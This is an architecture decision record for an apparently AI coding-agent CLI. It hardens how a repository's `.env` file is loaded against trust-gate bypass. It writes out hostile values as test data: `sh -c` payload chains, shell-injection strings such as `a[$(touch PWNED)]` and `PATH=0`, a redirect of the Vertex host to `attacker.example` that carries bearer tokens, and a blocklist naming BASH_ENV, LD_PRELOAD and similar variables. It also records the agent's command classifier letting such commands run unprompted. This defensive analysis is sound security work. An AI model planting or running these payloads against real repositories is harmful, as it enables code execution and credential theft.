# 0203. A cwd `.env` carries credentials, and a short checked list — nothing else

Status: Accepted (2026-08-01) — residual risk 1 and the provider-configuration arm amended by
ADR-0250 (2026-10-02, #362); the `ANTHROPIC_AUTH_TOKEN` paragraph of residual risk 1 narrowed
by ADR-0254 (2026-10-06, #374); the credential arm's VALUE shape-checked by the #756 note
(2026-11-10, owner decision) below, and in its fix round 1 (2026-11-10) the hatch's values too;
its fix round 2 (2026-11-10, the lead's calls) narrows the hatched URL and drops the leading
`-`/`.` refusal; its narrow-and-finish round (2026-11-10, the lead's call) loads a hatched URL's
`[` and `]` only as an IPv6 host
Date: 2026-08-01
Supersedes: the scope line in ADR-0149 ("explicit `-e`/`$AELIX_MCP_CONFIG`/entry_points
are user choices, never gated") — still the behaviour, but it now rests on a
precondition that did not previously hold.
Amends: ADR-0178 (its "🔒 SECURITY — global-scope-only read (the load-bearing
decision)" was load-bearing for the wrong half; see §3).
Relates: ADR-0197 (the `features.agents` delegation kill switch, same defeat).

## Context

`cli/entry.py::main_sync` calls `load_dotenv()` unconditionally, before
`asyncio.run(_async_main(...))`. The loader read a cwd-relative `.env`, filtered
**no** keys, and did `os.environ[key] = value` for anything not already set. The
Project Trust gate lives far later, inside `_async_main`.

So a repo you merely `git clone` and `cd` into could inject arbitrary environment
variables into the aelix process **before any trust decision existed**.

The tension that made this more than a one-line fix: `.env` is also how a
legitimate user supplies their own API keys in their own project. That workflow is
real and supported. A fix that simply stops reading `.env` breaks it.

## The four chains, reproduced

All measured 2026-08-01 against the real CLI (`python -m aelix_coding_agent
--print`), under `env -i` — no API key, no model, no network:

| Env var | Consumer | Result |
|---|---|---|
| `AELIX_MCP_CONFIG` | `cli/config.py` `load_mcp_server_contribs` — the `"env"` tier, never gated | spawned `sh -c <payload>`, marker written |
| `AELIX_SETTINGS_PATH` | `aelix_ai/settings/storage.py` `default_settings_path` | repo file becomes the GLOBAL settings store → `defaultProjectTrust: "always"` → `TRUST_GATE_DEFEATED` |
| `AELIX_CODING_AGENT_DIR` | `cli/config.py` `get_agent_dir` → `entry.py` `agent_dir=` | same defeat, different door |
| `OPENROUTER_BASE_URL` | `runtime_bootstrap.resolve_model` → `Model.base_url` (since #375 also `model_registry.with_openrouter_base_url` on every model the registry hands out — ADR-0251 §11) | traffic (Authorization header + full prompt) redirected to a 127.0.0.1 listener |

The MCP chain fires **even under `--no-approve`**, i.e. with the user explicitly
declining to trust the directory, because that tier never consults trust at all.

The two trust-defeat chains do **not** fire under `--no-approve`, and cannot: step
1 of `resolve_project_trusted` short-circuits on an explicit override before step
5 reads `defaultProjectTrust`. Their path is the ordinary one — no trust flag —
where step 6's non-interactive DENY is what the hijacked setting overturns.
Measured A/B in a repo carrying only `.env` + `.aelix/mcp.json`:

```
without .env  -> BOTH "skipped in an untrusted directory" notices, no marker
with .env     -> NEITHER notice, marker written (TRUST_GATE_DEFEATED)
```

The returning notices are the stronger assertion: they prove the gate is
functioning, where a missing marker alone would not.

## Decision

**Default-deny admission control inside `load_dotenv`: secret material, plus a
named provider-configuration list whose VALUES are shape-checked.**

Two alternatives were measured dead:

1. **Gating `.env` on Project Trust is a false green.** A repo carrying only a
   `.env` and no `.aelix/` has no trust-requiring resource, so
   `resolve_project_trusted` short-circuits at step 2 and returns `True`. Making
   trust real here means making `.env` itself trust-requiring — which prompts
   every developer who has one, and DENIES it non-interactively (ADR-0149's
   deny-by-default): their own key silently stops loading in CI.
2. **A denylist cannot be completed.** `tools/bash.py` hands `get_shell_env()`
   (`dict(os.environ)`) to every `bash -c`, and bash **sources** `$BASH_ENV` in
   every non-interactive shell — measured on bash 5.2.21. `BASH_ENV` carries no
   aelix prefix and is owned by bash; behind it sit `LD_PRELOAD`, `NODE_OPTIONS`
   (MCP via npx), `GIT_SSH_COMMAND`, `PYTHONSTARTUP`, `EDITOR`/`VISUAL`.

The dangerous set does not have to be enumerable. Only the safe one does.

**The rule is a suffix rule, not a table.** All 31 distinct names in
`ENV_API_KEYS` end in `_API_KEY`/`_KEY`/`_TOKEN`/`_SECRET`/`_PASSWORD` (measured:
0 refused), minus a `_DOTENV_NEVER` subtraction for credential-*shaped* names that
are really paths, URLs, programs or our own knobs. Both halves are stated against
corpora a reader can re-run rather than a count they have to trust: measured,
`_dotenv_key_allowed` refuses 0 of those 31 names and admits 0 of the 16 names in
`CONTROL_PLANE` (`tests/cli/test_dotenv_admission.py`), each of which carries its
dangerous consumer in the entry.

A closed allow-list was rejected on two measured cases: `OPENAI_RESPONSE_API_KEY`
is in the owner's own `.env` and has zero consumers anywhere in the repo — it is
in no table; and `MY_COMPANY_API_KEY` stands for any self-hosted provider, because
`model_registry.py` resolves an **arbitrary** env-var name declared in
`models.json`. That is a supported feature, so a table would refuse a legitimate
workflow. The suffix rule serves that feature only as far as the SHAPE reaches:
measured, a models.json provider declaring `ACME_ENDPOINT_NAME` as its `apiKey` is
still refused, and needs an export or the hatch. That residual is disclosed in
`.env.example` rather than fixed, because the alternative — admitting a name
because a repo-readable file says it is a key — is the closed-list failure in
reverse.

**A third arm for provider CONFIGURATION, admitted by name and by value shape.**
A credentials-only rule was an undisclosed provider regression **twice**, in the
same shape, which is why this arm now has a stated criterion instead of a list
someone extends by hand:

1. `google-vertex`'s primary documented auth path is ADC (ADR-0173), which uses
   no API key at all: it needs `GOOGLE_CLOUD_PROJECT`/`GCLOUD_PROJECT` and
   `GOOGLE_CLOUD_LOCATION`, and without both, `_vertex_config_missing` hides
   every Vertex model.
2. Both Cloudflare providers carry the catalog's only `{ENV_VAR}`-templated
   base URLs, and `_base_url_unconfigured` hides every model whose token is
   still unexpanded. `CLOUDFLARE_API_KEY` is admitted by the suffix rule while
   `CLOUDFLARE_ACCOUNT_ID` and `CLOUDFLARE_GATEWAY_ID` were not, so the failure
   looked like a working configuration. Measured A/B at
   `core.runnable_models.is_runnable`, one `.env`, `env -i`, no network:

   ```
   0c9da7d      total runnable 847   cloudflare-ai-gateway 35/35   cloudflare-workers-ai 8/8
   ids refused  total runnable 804   cloudflare-ai-gateway  0/35   cloudflare-workers-ai 0/8
   per-provider diff over all 35 providers: exactly two moved, delta 43
   ids admitted total runnable 847   cloudflare-ai-gateway 35/35   cloudflare-workers-ai 8/8
   ```

**The criterion: a name a provider's models need in order to be VISIBLE belongs
in this arm.** Today that is (a) every `{ENV_VAR}` token in a catalog `baseUrl`
and (b) every name a `runnable_models` config guard reads. Measured with a
recording `os.environ` over all 1001 catalog models, `is_runnable` consults
exactly six names — `CLOUDFLARE_ACCOUNT_ID`, `CLOUDFLARE_GATEWAY_ID`,
`GOOGLE_CLOUD_API_KEY`, `GOOGLE_CLOUD_PROJECT`, `GCLOUD_PROJECT`,
`GOOGLE_CLOUD_LOCATION` — and all six are admitted: five by this arm, and
`GOOGLE_CLOUD_API_KEY` by the suffix rule. Half (a) is now mechanical:
`test_every_templated_base_url_token_is_admissible` walks the shipped catalog, so
a provider added with a templated base URL fails at the test rather than in
someone's `/model` picker.

The value is checked, because for Vertex the location owns the request HOST.
Measured, no network: `create_vertex_client(project=…, location=L)` builds
`https://{L}-aiplatform.googleapis.com/`, so

```
location='us-central1'              NETLOC 'us-central1-aiplatform.googleapis.com'
location='attacker.example/x'       NETLOC 'attacker.example'
location='attacker.example:8443/v1' NETLOC 'attacker.example:8443'
```

An unvalidated `GOOGLE_CLOUD_LOCATION` is chain 3 by another name, carrying an ADC
bearer token and the whole prompt off googleapis.com. `_GCP_NAME`
(`\A[a-z][a-z0-9-]{0,61}[a-z0-9]\Z`) forbids `/ @ : .` structurally. The shape
check is **unconditional and runs before the escape hatch**: measured, hatch-first
admits `attacker.example/x` and yields
`base_url='https://attacker.example/x-aiplatform.googleapis.com/'`. The hatch names
a KEY; for these names the redirect lives in the VALUE.

The Cloudflare ids are the weaker, path-only case, and the difference was measured
rather than assumed: the 16 hostile values of `CF_IDS_BAD` against the catalog's
4 `{CLOUDFLARE*}`-templated base URLs is 64 cases, each expanded and then joined
by a real `httpx.Client`. 60 produced a URL and every one of them left the
request host at `gateway.ai.cloudflare.com` or `api.cloudflare.com`; the other 4
are the single value `x\ty`, raising `httpx.InvalidURL` on each template.
`_CF_ID` (`\A[A-Za-z0-9_-]{1,64}\Z`) is still load-bearing because the PATH is
not fixed — measured with the rule removed, `../../..` climbs out of
`/v1/{account}/{gateway}/`, `x/../../../../../attacker.example` reaches
`https://gateway.ai.cloudflare.com/attacker.example/…`, and `x#f` truncates the
gateway routing out of the path entirely.

**An earlier draft of this ADR claimed `_GCP_NAME` "excludes no legitimate
value". That claim is withdrawn: it is an assertion about Google's documented
syntax and there is no network here to check it against.** What is measured is
the accept/reject table committed as `GCP_NAMES_OK` / `GCP_NAMES_BAD`, and one
shape the rule does exclude — a numeric GCP project (`123456789012`), because the
first character must be a letter. Whether Vertex accepts a project *number* where
it accepts a project *id* is exactly the offline-unverifiable part, so the rule is
left as-is and the bound is written down instead. Same for `_CF_ID`: no claim is
made about Cloudflare's documented id syntax, only that every structural escape
constructible here is rejected. In both cases the shape check lives inside
`load_dotenv` and governs the `.env` path only, so **any** value still works when
the user exports it in their own shell.

`GOOGLE_APPLICATION_CREDENTIALS` is **refused**: it is a path to a full GCP
service-account identity a repo can ship, whose `token_uri` points the signed
assertion wherever the repo likes. Refusing it does not break ADC — measured,
`google.auth.default()` resolves credentials from the well-known Cloud SDK path
with that variable unset, which is a different checker from the explicit one that
reads it. `AELIX_CODEX_ORIGINATOR` is refused because `^AELIX_` is the invariant
this whole design leans on. Both remain available through the hatch, and
`.env.example` now names both — for one round it named only
`GOOGLE_APPLICATION_CREDENTIALS` while the code comment and this ADR both claimed
it named both.

**Escape hatch: `AELIX_DOTENV_ALLOW=NAME[,NAME…]`** — per-key, real-environment
only, no wildcard, and unable to unlock `_DOTENV_LOCKED`. An all-or-nothing hatch
keyed on Project Trust was rejected: trust records are nearest-ancestor, so
trusting `~/src` once would re-open `BASH_ENV`/`LD_PRELOAD`/`AELIX_MCP_CONFIG` for
every repo ever cloned beneath it.

**The floor under the hatch is drawn on one criterion**, which is the maintained
artifact — the list is only its current application:

> the hatch may let a repo REDIRECT; it may never let a repo EXECUTE, and it may
> never let a repo choose the global settings/auth store or widen the gate itself.

**#756 fix round 1 (2026-11-10).** Until then the floor held the criterion only by NAME: a
name the hatch opened loaded any value, and a value is read again by the shell. Measured on
`ced24970`, with `AELIX_DOTENV_ALLOW=OPENROUTER_BASE_URL` exported and
`OPENROUTER_BASE_URL=a[$(touch PWNED)]` in a repo `.env`, `echo $((OPENROUTER_BASE_URL))` created
`PWNED` in bash. Now a hatched name loads only a credential-shaped value or a URL (the #756 note
below). Fix round 1 claimed that the criterion then held for the value too. The round-2 verify
showed it did not: a URL pasted as text into an array subscript (`let "y=a[$V]"`) ran a `$(…)`, a
backtick or a `<(…)` after `://`. Fix round 2 refuses `$`, a backtick, `<` and `>` in the URL.
The round-3 verify showed a URL with none of them that closed the subscript itself: with
`https://x.example/]+(PATH=0)+m[x` hatched, `echo $(( a[$V] ))` in zsh and
`typeset -A m; let "y=m[$V]"` in bash 5.2 and 5.3, zsh and ksh93 assigned `PATH=0`, and the
next `ls` ran the repo's `./0/ls`. The narrow-and-finish round loads a URL's `[` and `]` only
as an IPv6 host. What is measured since, and all that is claimed: in 46 command forms (the
variable read by name; its value pasted into arithmetic, an array or associative-array
subscript or a test; or expanded plainly) in 10 shells (macOS bash 3.2, zsh, dash and ksh93u+;
Linux docker bash 5.2 and 5.3, zsh 5.9, dash, ksh93u+m and mksh), of the 53 URLs the rule
admits among 129 measured, none ran anything through a read by name or a subscript
(`.omc/probes/756/finish/grid/`). The criterion does not hold for every hatched value even
there, because a value is also a path: a key-shaped one such as `marker` or `./marker` reaches
a repo script through `sh "$X"`, `. $X` or `$X`, and a URL such as `https://x.example/*`, which
globs to a repo file `https:/x.example/v1`, through `$X` or `. $X`; the classifier asks before
each (the #756 note's residual (e)). Other forms and shells are not measured, and the note's
other residuals apply too.

The first version of `_DOTENV_LOCKED` used a different criterion ("these decide
where aelix's global settings live") and therefore omitted `AELIX_MCP_CONFIG` —
the only chain that fires under `--no-approve`, and the only one that is arbitrary
code execution rather than an indirect trust defeat. Measured, one pasted
`export AELIX_DOTENV_ALLOW=AELIX_MCP_CONFIG` restored startup `sh -c <payload>` in
full. The floor is now 14 names: five store/identity locators, the gate itself,
and eight whose value alone names a program (`AELIX_MCP_CONFIG`, `BASH_ENV`,
`LD_PRELOAD`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PYTHONSTARTUP`, `EDITOR`,
`VISUAL`). The last three fire on a user action or an interactive interpreter
rather than on aelix's own startup; they are listed because the criterion is about
the value naming a program. Measured with this set: all 14 held, `OPENROUTER_BASE_URL`
and `PI_OFFLINE` still hatchable, so the hatch keeps the use case it exists for.

Note the asymmetry, because it matters to whoever maintains this: the ADMISSION
rule is default-deny and complete by construction. `_DOTENV_LOCKED` is a
best-effort floor under a user-typed opt-in and is **not** claimed to be complete.
Apply the criterion to a name nobody has thought of yet.

**Precedence is corrected where we implement it, and disclosed where we do not.**
`setdefault` protects a key NAME, not a provider: `ENV_API_KEYS['anthropic']` has
two names and `get_env_api_key` returns the first non-empty one, so a repo `.env`
supplying `ANTHROPIC_OAUTH_TOKEN` never collided with an exported
`ANTHROPIC_API_KEY` — it simply outranked it. A provider-group guard now refuses a
`.env` key when it would **outrank** the name the selector is currently picking:
it compares INDEX in `ENV_API_KEYS[provider]` against a snapshot of the real
environment taken before any line is applied. The hatch bypasses it.

The index comparison is the correction of a second false claim, not a detail. The
first version of the guard refused whenever *any* sibling was present, so the
opposite direction — shell `ANTHROPIC_OAUTH_TOKEN` (index 0), `.env`
`ANTHROPIC_API_KEY` (index 1) — was refused too, and the notice told the user
their key "would have outranked" a token that measurably outranks it. That dropped
a key the user asked for and explained it with a falsehood. Both directions are
now pinned by tests.
`gh`'s preference for `GH_TOKEN` over `GITHUB_TOKEN` is deliberately **not**
overridden: it is gh's precedence, not ours, and `GITHUB_TOKEN` is an ambient
platform default in GitHub Codespaces while a `.env` `GH_TOKEN` is a deliberate
user choice. Measured, closing it printed `shadowed [('GH_TOKEN','GITHUB_TOKEN')]`
and broke that setup in every Codespace. It gets a disclosure line instead.


## #756 note (2026-11-10): a credential's VALUE is shape-checked too

Owner decision, 2026-11-10, on #756's direction: **"적재 시 값 모양 검사 (권장)"** — a `.env`
credential whose value carries shell metacharacters such as `$`, a backtick, `[` or `(` is not
loaded, and the user is told.

**Why the name was not enough.** The Decision above treats any value under a credential-shaped
name as inert data. A shell does not: the bash tool hands `os.environ` to every `bash -c`, and in
arithmetic a variable's value is evaluated as an expression of its own. Measured in
`.omc/probes/756/impl/out/grid-mac.jsonl` (bash 3.2.57, zsh, dash and ksh93u+ on macOS) and
`grid-linux.jsonl` (bash 5.2.37, zsh 5.9, dash, ksh 93u+m and mksh R59 in Linux docker), 13
command forms each, with `EVIL_API_KEY` holding:

- `a[$(touch PWNED)]`: `echo $((EVIL_API_KEY))`, `(( EVIL_API_KEY ))` and
  `echo ${a[EVIL_API_KEY]}` created `PWNED` in both bash builds, macOS ksh93u+ and mksh, and not
  in zsh, dash or ksh 93u+m;
- `1 -eq a[$(touch${IFS}PWNED)]`: the unquoted `[ $EVIL_API_KEY = x ]` created `PWNED` in macOS
  ksh93u+ and mksh;
- `PATH=0`: an arithmetic ASSIGNMENT. The `ls` after it ran the work folder's `./0/ls` in bash,
  zsh, both ksh builds and mksh (22 runs on macOS, 30 on Linux). So `=` inside a value is code too.

At `467f9a52` the classifier allows `echo $((EVIL_API_KEY))`, `(( EVIL_API_KEY ))`,
`echo ${a[EVIL_API_KEY]}`, `echo $[EVIL_API_KEY]` and `[ $EVIL_API_KEY = x ]` (`out/cls-head.txt`).
Live, in a pty TUI under `--permission-mode auto` with a scripted model, `467f9a52` ran
`echo $((EVIL_API_KEY))` (bash) and `[ $EVIL_API_KEY = x ]` (ksh, the split value) with no dialog,
and `PWNED` appeared (`out/live-base-bash.txt`, `out/live-base-ksh.txt`).

**The rule.** A name the credential rule admits (its suffix, or `ENV_API_KEYS`) is loaded from a
cwd `.env` only if its value is credential-shaped (`_dotenv_credential_value_ok`). As first
shipped (`ced24970`) that was the regex `\A(?:[A-Za-z0-9._+/-]+={0,2})?\Z`. Fix round 1 made it
two rules:

1. Characters: letters, digits and `- _ . + / ~ : %`, at most two `=` at the end (base64
   padding): `\A(?:[A-Za-z0-9._+/~:%-]+={0,2})?\Z`. Fix round 1 also refused a leading `-` or
   `.`; fix round 2 dropped that (residual (e) and (f)).
2. No name in the value (a run of letters, digits and `_`) may be `_` or one of the shell's own
   variables (`_SHELL_OWN_NAMES`), and nothing may start ksh93's `.sh.` namespace. `.sh.match` at
   the start of a value is still refused by that last clause
   (`test_a_value_naming_a_shell_variable_is_refused[ksh-sh-match-lead]`).

Where the characters come from:
- The vendors' published prefixes and character sets as the first lane knew them, NOT fetched:
  OpenAI `sk-`/`sk-proj-`, Anthropic `sk-ant-api03-`/`sk-ant-oat01-`, OpenRouter `sk-or-v1-`,
  Google `AIza…`, Azure hex, AWS key ids, secrets (`/`, `+`) and STS session tokens (`=` padding),
  Bedrock long-term keys (`=` padding), GitHub `ghp_`/`ghu_`/`github_pat_`, Hugging Face `hf_`,
  JWTs (`.`), Z.ai `<hex>.<id>`.
- Pages the #756 verify fetched (`.omc/probes/756/verify-r1/key-formats-handback.md`):
  - Entra client secrets: up to 40 of `a-z 0-9 - _ . ~` (Microsoft Purview's pattern page,
    fetched again in fix round 1).
  - Telegram bot tokens: `<id>:<secret>`.
  - X app-only bearer tokens, which carry `%`.
  - Azure storage account keys (end in `==`) and GitLab `glpat-` tokens, which the first rule
    already admitted.
  - Django's `SECRET_KEY` generator (`!@#$%^&*(-_=+)`), which neither version admits.
- Fix round 1 admitted `~`, `:` and `%` for the first three. They were measured inert (below).

31 synthetic samples built at runtime are loaded: the first round's 28 plus Entra, Telegram and X
(`test_every_documented_key_format_is_still_admitted`). All 31 `ENV_API_KEYS` names, each carrying
its vendor's format, are loaded too (`test_every_shipped_provider_key_is_admitted_in_its_own_format`).
Four vendors (ant-ling, kimi, opencode, xiaomi) publish no prefix this lane could cite, and are
measured with the generic `sk-` plus alphanumerics shape. The owner's own OpenRouter key matches
the first rule (checked in-process and printed as a boolean only).

**What a loaded value could not do, measured.**
- First round. 50 values the first rule admitted ran nothing in 5,850 shell runs (9 shells, 13
  forms; each run folder carried `./0/ls`, `./1/ls` and `./-1/ls` traps, so a `PATH` assignment
  would have shown). They were 31 format samples (one of them empty) and 19 hostile values built
  only from the allowed characters: `FOO_TOKEN+1`, `_`, `PATH=`, `PATH==`, `x+PATH=`, `-PATH=`,
  `PATH+=`, `PATH-=`, `PATH/=`, `IFS++`, `++IFS`, `--PATH`, `.sh.version`, `a.b`, `1.5`, `0x41`,
  `/etc/passwd`, `-eq` and `-t`. A trailing `=` cannot assign, because no operand follows it.
  Fix round 1 refused 14 of those 19: every one that names a shell variable or starts with `-` or
  `.`. Since fix round 2, `-eq` and `-t` load again; the other 12 name a shell variable or start
  ksh93's `.sh.`.
- Fix round 1, on the verify's 17 forms, the same 9 shells (`.omc/probes/756/fix-r1/grid/`). The
  40 values the new rules admit ran nothing in 6,120 runs. They are:
  - 26 credential-shaped values: Entra (two), Telegram, X, Elastic `id:key`, Anthropic and STS
    samples, and 19 hostile values over the widened set such as `~x`, `~~FOO_TOKEN`, `:FOO_TOKEN`,
    `1%0`, `FOO%BAR`, `~a:b%c`, `x++`, `+x` and `/bin/sh`;
  - 14 URL values the hatch then admitted: the verify's `?a=1&PATH=0` and `?1?PATH=0:0` URLs,
    `https://x.example/_?IFS++&_`, and 11 payload URLs with no space, such as
    `https://x.example/a[$(touch${IFS}PWNED)]`, the same after an upper-case or `git+ssh.x`
    scheme, `https://x.example/;touch${IFS}PWNED` and
    `https://x/${IFS}-eq${IFS}a[$(touch${IFS}PWNED)]`. Those 17 forms read the variable by
    name or paste it as arithmetic text, and none put it inside an array subscript.
- The round-2 verify added 23 forms that paste the value into an array subscript, a test, a
  command name or an argument (40 in all), on the same 9 shells and bash 5.3
  (`.omc/probes/756/verify-r2/grid/url-*.jsonl`). Of 90 values only the URL rule admitted, 43
  ran something, all through a subscript: `let "y=a[$U]"` and `typeset -i y; y="a[$U]"` in bash
  3.2, 5.2 and 5.3, macOS ksh93u+ and mksh; `unset "x[$U]"` in the three bash builds and mksh;
  `$(( a[$U] ))`, `(( a[$U] ))` and `(( m[$U]++ ))` in bash 3.2 and mksh; `[[ -v a[$U] ]]` and
  `test -v` in bash 5.2/5.3 and mksh; `printf -v "a[$U]"` in bash 5.2/5.3. Each of the 43 held
  `$`, a backtick, `<` or `>`: a `$(…)`, a backtick or a `${…}` after `://`, `'$(…)'` (bash
  5.2/5.3 and mksh), `<(…)` (bash 3.2) or `$((PATH=0))` (the trap `ls` ran in zsh and ksh93u+).
  The verify found that the classifier asks before all 16 such forms it tried
  (`verify-r2/out/cls2-fix.txt`).
- Fix round 2 re-ran that grid (`.omc/probes/756/fix-r2/grid/`, 44,000 runs): the 90 values
  plus 20 more (6 real base URLs with a port, a query, IPv6 `[::1]`, `%`-encoding, userinfo
  and a fragment, and 14 hostile ones such as `https://x.example/a[_]`, `x://a[PATH=0]`,
  `x://IFS++`, `x://'a[1]'` and `https://x.example/;touch`). The 55 values the narrowed rule
  admits (35 of the 90 and all 20) ran nothing in 22,000 runs. The 55 it refuses include the
  verify's 43, which fired again in the same shells.
- The round-3 verify (`.omc/probes/756/verify-r3/`) found that tail still admitted `]`, which
  closes the subscript a form pastes the value into: `https://x.example/]+(PATH=0)+m[x`,
  `https://x.example/],PATH=0,m[x` and `http://[::1]:80/]+(PATH=0)+m[x` assigned `PATH=0`, and
  live under auto, once the dialog was approved, the next `ls` ran a planted `./0/ls`. It
  reported bash 5.3 inert. That bash 5.3 image, like fix round 2's, had no `/usr/bin/touch`,
  which its trap `ls` and marker scripts call, so no trap or marker could register there;
  only a `PWNED` that a `$(touch …)` in the value itself created could
  (`finish/grid/url-b53-blind.jsonl`).
- The narrow-and-finish round re-ran it (`.omc/probes/756/finish/grid/`, 59,340 runs): 129
  values (108 of fix round 2's, 13 of the round-3 verify's, 8 more), 46 forms (fix round 2's 40
  and the round-3 verify's 6 associative-array and `ls files/*` forms), the same 9 shells and
  bash 5.3 with `/usr/bin/touch` added. Of the 53 values the rule admits, among them 8 real base
  URLs (OpenRouter's, `localhost:11434`, a port with a query, `%`-encoding, userinfo with a
  fragment, `[::1]:8080`, `user@[2001:db8::1]` and `[::ffff:127.0.0.1]`), one ran anything in
  24,380 runs, and only as a path: `https://x.example/*` (residual (e)). Of the 21 values it
  refuses that `b95ed1b8` admitted, 4 fired: the verify's three and
  `https://x.example/]+_+m[x`, whose `_` after `ls files/*` created `PWNED` in bash 5.2 and 5.3.
- Through the loader (`finish/out/repro-matrix.txt`): the round-3 verify's three forms,
  `echo $(( a[$U] ))`, `let "y=a[$U]"` and `typeset -A m; let "y=m[$U]"`, with `U` set to what
  `load_dotenv` left of 25 hatched values (the verify's 14, 8 bracket rows and 3 IPv6 base
  URLs), in the same 10 shells, 750 runs a tree. On `b95ed1b8` all 25 loaded, and 5 ran the
  planted `./0/ls` in bash 5.2 and 5.3, zsh, ksh93u+ and ksh93u+m (not in bash 3.2, mksh or
  dash). On the fix 10 loaded and none did.
- Among the 21 values the rules refuse, the positive controls fired in the same grid.
  `a[$(touch PWNED)]` created `PWNED` in both bash builds, macOS ksh93u+ and mksh. `PATH=0` ran a
  trap `ls`. `_` and `1+_` created `PWNED` in both bash builds, through `ls files/*` and through
  `cd` into a planted folder. `~CDPATH++` and `--CDPATH` moved `cd src` into `1/src` in both bash
  builds and mksh.

**Where it sits.** The check runs ahead of the hatch and of the sibling guard, for the config arm's
reason: the hatch names a KEY, and the code is in the VALUE
(`test_the_hatch_cannot_override_a_credential_value_shape`). Since fix round 1 the check also
covers a credential-suffixed name that `_DOTENV_NEVER` takes back (`NPM_TOKEN`, `NODE_AUTH_TOKEN`,
`GIT_TOKEN`, `SSH_KEY`, `PROXY_PASSWORD`, `SERVICE_URL_KEY`), which only the hatch can load
(`test_a_hatched_credential_name_still_has_its_value_checked`). It also covers every other name the
hatch opens: such a value loads if it is credential-shaped or a URL (a scheme, `://`, then
printable ASCII with no space and, since fix round 2, none of `$`, a backtick, `<` or `>`; since
the narrow-and-finish round, `[` and `]` only as an IPv6 host: `[userinfo@]`, then hex digits,
`:` and `.` in brackets, an optional `:port`, then `/`, `?`, `#` or the end), and
the scheme is held to rule 2
(`test_a_hatched_non_credential_value_that_is_not_a_url_or_key_is_refused`,
`test_a_hatched_url_flag_or_model_id_still_loads`). A configuration-arm value is held to rule 2
(`_dotenv_config_refusal`), because a Cloudflare id (`[A-Za-z0-9_-]`) can be `_` or `REPLY`: on
`ced24970`, `CLOUDFLARE_GATEWAY_ID=_` from a repo `.env` made bash 3.2 run a repo file name
through `ls files/* >/dev/null; echo $((CLOUDFLARE_GATEWAY_ID))`, which the classifier allows
(`test_exploit_an_underscore_cloudflare_id_never_reaches_a_repo_file_name_in_bash`,
`fix-r1/cfg/`). That one is this lane's call in fix round 1, found after the verify; the GCP
shape already excludes it. Fix round 1 also refused a Cloudflare id led by `-`; fix round 2
dropped that with rule 1's (`test_a_cloudflare_id_led_by_dash_loads`). Read by name, a URL stops
at the `:` after its scheme. Pasted as text into an array subscript it does not, which is why
fix round 2 refuses the four characters (above), and a `]` there closes the subscript, which is
why the narrow-and-finish round holds the brackets to an IPv6 host. The scheme itself is read
first: measured, `Y://h.example/v1` with `Y=a[$(touch PWNED)]` created `PWNED` in bash 3.2 and
macOS ksh93u+ (`fix-r1/probe/scheme-mac.jsonl`). The URL rule is the lead's call in fix rounds 1
and 2 and in the narrow-and-finish round, not the owner's. It holds this ADR's floor criterion
only as far as it was measured: for the URLs it admits, read by name or pasted into a subscript,
in the 46 forms and 10 shells above. A URL is still a path (residual (e)), and the rule changes
which hatched values load.
A credential-suffixed name only the hatch loads gets the name notice while the hatch is closed,
whatever its value, as every other such name does; its value is checked once the hatch names it
(`test_a_hatched_off_credential_name_gets_the_name_notice_whatever_its_value`). On `141b6430` a
bad value got the value notice first, and fixing the value surfaced the name notice. A key already in the environment is skipped
without a notice, as the base loader skipped it: the line would not set it
(`test_a_key_you_exported_gets_no_notice_for_its_dotenv_duplicate`). A refused value gets the existing
bad-value notice: one stderr line per key, naming the key and never the value
(`test_a_credential_value_a_shell_could_run_is_refused`,
`test_the_credential_value_notice_says_why_and_offers_no_hatch`). Its remedy is an export, not the
hatch. A refused line is not recorded in `AELIX_DOTENV_ADMITTED`
(`test_a_refused_credential_value_is_not_recorded_as_supplied`). Live on the fix, the same TUI
rows left the variable unset, nothing was created, and the notice showed above the banner
(`out/live-fix.txt`). One real model (`openai/gpt-4.1-mini` on OpenRouter, the key exported to the
child only) ran `echo $((EVIL_API_KEY))` under auto and got `0`. No `PWNED` appeared, while
`MY_SERVICE_API_KEY` (Anthropic format) and `AWS_SESSION_TOKEN` (STS format, ending `==`) loaded.
The notices stayed on stderr: `-p` stdout held only the answer, all 41 `--mode json` stdout lines
parsed as JSON, and `--mode rpc` wrote 0 stdout bytes in its first 8 seconds (`out/real-run.txt`,
`out/rpc-check.txt`).

**Behaviour that changed with it, measured.**
- A NUL in a credential value made `load_dotenv` raise `ValueError: embedded null byte` at launch on
  `467f9a52`. The line is now refused with the notice
  (`test_a_nul_in_a_credential_value_is_refused_not_a_crash`).
- `OPENAI_API_KEY=sk-… # work key` used to load with the comment as part of the key. It is now
  refused with the notice (`test_a_credential_value_with_a_trailing_comment_is_refused`).
- A `*_PASSWORD` value with a character outside the set (`$`, `!`, `@`, `#`, a space, …) no longer
  loads from a `.env` (`test_one_character_outside_the_key_formats_is_refused`). Export it in your
  shell.
- Fix round 1, each refused with the notice. These loaded on `ced24970`:
  - A credential value that starts with `-` or `.` (until fix round 2, below).
  - A value with a lone `_` (no letter or digit on either side) or another shell variable's
    name. Re-measured in fix round 2 over 200,000 random keys per shape (`fix-r2/fp/fp3.txt`):
    0.262 % of 40-character values over the Entra alphabet, 0.176 % of JWTs, 0.123 % of Elastic
    `id:key` pairs, 0.110 % of `sk-proj-` keys, 0.071 % of Telegram-shaped tokens, 0.063 % of
    unprefixed 40-character base64url keys and 0.054 % of `sk-ant-api03-` keys, nearly all for a
    lone `_`; a name other than `_`, at most 4 in 200,000 of a shape.
  - A Cloudflare account or gateway id that is `_` or names another shell variable.
  - A hatched value that is neither credential-shaped nor a URL. Measured with the hatch open for
    each (`fix-r1/probe/hatched-changes-*.txt`), `NO_PROXY=localhost,127.0.0.1` and a path with a
    space loaded on `ced24970` and are refused now. A base URL, `PI_OFFLINE=1`, a
    `vendor/model:beta` id and a `GOOGLE_APPLICATION_CREDENTIALS` path still load.
- Fix round 2 (the lead's calls, not the owner's):
  - A credential value, a hatched value or a Cloudflare id that starts with `-` or `.` loads
    again, as on `ced24970` (`test_a_value_led_by_dash_or_dot_loads`,
    `test_a_cloudflare_id_led_by_dash_loads`, the `-delete` and `./marker` rows of
    `test_a_hatched_url_flag_or_model_id_still_loads`). With that rule, the round-2 verify measured
    3.228 % of Entra-alphabet values, 1.697 % of Elastic pairs and 1.603 % of unprefixed
    base64url keys refused; without it, 0.262 %, 0.123 % and 0.063 % (`verify-r2/out/fp2.txt`,
    re-measured in `fix-r2/fp/fp3.txt` with the same generator).
  - A hatched URL holding `$`, a backtick, `<` or `>` is refused with the notice. Each of the
    seven `url-*` rows of `test_a_hatched_non_credential_value_that_is_not_a_url_or_key_is_refused`
    loaded on `141b6430`.
